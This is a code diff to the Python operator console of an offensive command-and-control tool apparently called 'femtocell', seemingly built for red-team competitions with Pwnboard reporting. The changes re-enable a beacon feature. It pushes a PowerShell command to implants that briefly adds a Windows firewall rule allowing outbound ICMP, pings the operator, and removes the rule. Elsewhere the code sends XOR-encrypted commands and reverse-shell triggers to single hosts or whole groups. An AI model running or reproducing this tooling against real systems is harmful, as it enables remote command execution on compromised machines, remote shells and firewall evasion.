@@ -7,11 +7,14 @@ import confuse
 import socket
 import requests
 import multiprocessing
+import time
 
 import handle_args
 import handle_interactive
 
 parsedConfig = {}
+
+interface = None
 
 baseparams = {"MODE": "", "FILE": "", "XOR": True, "PWNBOARD": None}
 
@@ -37,6 +40,11 @@ groupparams = {
     "TRANSPORT": "TCP",
 }
 
+def main():
+    print_banner()
+    handle_args.setup_args()
+    handle_interactive.interactive_main()
+
 
 def updatePwnboard(ip, mode):
     data = {"ip": ip, "application": "femtocell", "access_type": mode}
@@ -54,61 +62,32 @@ def listen():
         updatePwnboard(shellparams["RHOST"], "shell")
     print(colored("\n[*] Shell closed.\n", "cyan"))
 
+def pingListen():
+    print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
+    pkts = scapy.sniff( iface=interface, filter="icmp", timeout=15) 
+    tCallbacks = []
 
-# def pingListen():
-#     print(colored(f"[*] Waiting 15 seconds for callbacks.\n", "cyan"))
-#     pkts = scapy.sniff(
-#         iface="utun3", filter="icmp", timeout=15
-#     ) 
-#     tCallbacks = []
+    for packet in pkts:
+        if str(packet.getlayer(scapy.ICMP).type) == "8":
+            tCallbacks.append(packet[scapy.IP].src)
 
-#     for packet in pkts:
-#         if str(packet.getlayer(scapy.ICMP).type) == "8":
-#             tCallbacks.append(packet[scapy.IP].src)
-
-#     fCallbacks = list(dict.fromkeys(tCallbacks))
-#     for ip in fCallbacks:
-#         print(colored(f"[+] Ping received from: {ip}\n", "green"))
-#         updatePwnboard(ip, "beacon")
+    fCallbacks = list(dict.fromkeys(tCallbacks))
+    for ip in fCallbacks:
+        print(colored(f"[+] Ping received from: {ip}\n", "green"))
+        updatePwnboard(ip, "beacon")
 
 
-# def initPing(params):
-#     targetIP = params["LHOST"]
-#     pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
-#     return pingmode
-def executeShell():
-    if verify(shellparams):
-        ip = shellparams["RHOST"]
-        plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
-        t = multiprocessing.Process(target=listen)
-        t.start() # start listener
-        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
-        execute(plaintext, shellparams)
-        try:
-            t.join() # wait until thread is finished
-        except KeyboardInterrupt:
-            t.terminate()
+def initPing(params):
+    if interface is None:
+        return None
 
-def executeCmd():
-    if verify(cmdparams):
-        plaintext = "FC-CM-{}\00".format(cmdparams["COMMAND"])
-        ip = cmdparams["RHOST"]
-        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
-        execute(plaintext, cmdparams)
-
-def executeGroup():
-    if verify(groupparams):
-        plaintext = "FC-CM-{}\00".format(groupparams["COMMAND"])
-        if parsedConfig.get(groupparams.get("GROUP")) == "":
-            return
-        groupList = getGroup()
-        for iplist in groupList:
-            for ip in iplist:
-                groupparams["RHOST"] = ip
-                print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
-                t = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
-                t.start()
-            t.join()
+    import netifaces as ni
+    try:
+        targetIP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+    except ValueError:
+        return None
+    pingmode = "FC-CM-{}\00".format("powershell -c netsh adv f a r dir=out protocol=icmpv4 action=allow name=\"y\"; ping " + targetIP + " -n 1; netsh adv f delete rule name=\"y\"")
+    return pingmode
 
 def validGroupKey():
     key = groupparams["GROUP"]
@@ -182,13 +161,6 @@ def print_groups():
             print(parsedConfig[item + ":hosts"])
 
 
-def xor_encrypt(byte_msg, byte_key):
-    encrypt_byte = b""
-    for b in byte_msg:
-        encrypt_byte += chr(b ^ byte_key).encode()
-    return encrypt_byte
-
-
 def print_help(location):
     if location == "sub":
         print( colored( "\n[?] REQUIRED: set <key> <value>\n[?] BACK: back/exit\n[?] INFO: options\n[?] INFO: targets (GROUP mode only)\n[?] OPTIONAL: ping (group and cmd modes only)\n[?] REQUIRED: execute\n", "yellow",))
@@ -217,11 +189,14 @@ def print_banner():
     """
     )
 
-def main():
-    print_banner()
-    handle_args.setup_args()
-    handle_interactive.interactive_main()
-    
+
+def xor_encrypt(byte_msg, byte_key):
+    encrypt_byte = b""
+    for b in byte_msg:
+        encrypt_byte += chr(b ^ byte_key).encode()
+    return encrypt_byte
+
+
 def verify(params):
     passing = False
 
@@ -239,15 +214,83 @@ def verify(params):
         print(colored("[!] LHOST required.\n", "red"))
         passing = False
 
-    if (baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP") and params["COMMAND"] == "" or params["COMMAND"] == None:
-        print(colored("[!] COMMAND required.\n", "red"))
-        passing = False
+    if baseparams["MODE"] == "CMD" or baseparams["MODE"] == "GROUP":
+        if params["COMMAND"] == "" or params["COMMAND"] == None:
+            print(colored("[!] COMMAND required.\n", "red"))
+            passing = False
 
     if baseparams["MODE"] == "GROUP" and not validGroupKey():
         passing = False
 
     return passing
 
+
+def executeShell():
+    if verify(shellparams):
+        ip = shellparams["RHOST"]
+        plaintext = "FC-SH-{}\00".format(shellparams["LHOST"])
+        t = multiprocessing.Process(target=listen)
+        t.start() # start listener
+        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
+        execute(plaintext, shellparams)
+        try:
+            t.join() # wait until thread is finished
+        except KeyboardInterrupt:
+            t.terminate()
+
+def executeCmd():
+    if verify(cmdparams):
+        plaintext = "FC-CM-{}\00".format(cmdparams["COMMAND"])
+        ip = cmdparams["RHOST"]
+        print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
+        execute(plaintext, cmdparams)
+
+def executeGroup():
+    if verify(groupparams):
+        plaintext = "FC-CM-{}\00".format(groupparams["COMMAND"])
+        if parsedConfig.get(groupparams.get("GROUP")) == "":
+            return
+        groupList = getGroup()
+        for iplist in groupList:
+            for ip in iplist:
+                groupparams["RHOST"] = ip
+                print(colored(f"[*] Sending {plaintext[6:]} --> {ip}\n", "cyan"))
+                t = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
+                t.start()
+            t.join()
+
+def executePing():
+    if baseparams["MODE"] == "CMD" and verify(cmdparams):
+        plaintext = initPing(cmdparams)
+        if plaintext is None:
+            print(colored("[!] Interface not set correctly.\n", "red"))
+            return
+        t = multiprocessing.Process(target=pingListen)
+        t.start()
+        time.sleep(2)
+        execute(plaintext, cmdparams)
+        t.join()
+    elif baseparams["MODE"] == "GROUP" and verify(groupparams):
+        if parsedConfig.get(groupparams.get("GROUP")) == "":
+            return
+        groupList = getGroup()
+        plaintext = initPing(groupparams)
+        if plaintext is None:
+            print(colored("[!] Interface not set correctly.\n", "red"))
+            return
+        t = multiprocessing.Process(target=pingListen)
+        t.start()
+        time.sleep(2)
+        for iplist in groupList:
+            for ip in iplist:
+                groupparams["RHOST"] = ip
+                e = multiprocessing.Process(target=execute, args=(plaintext,groupparams,))
+                e.start()
+        e.join()
+        t.join()
+
+    else:
+        print(colored("[!] PING only works on GROUP or CMD mode.\n", "red"))
 
 def execute(plaintext, params):
     if baseparams["XOR"]:
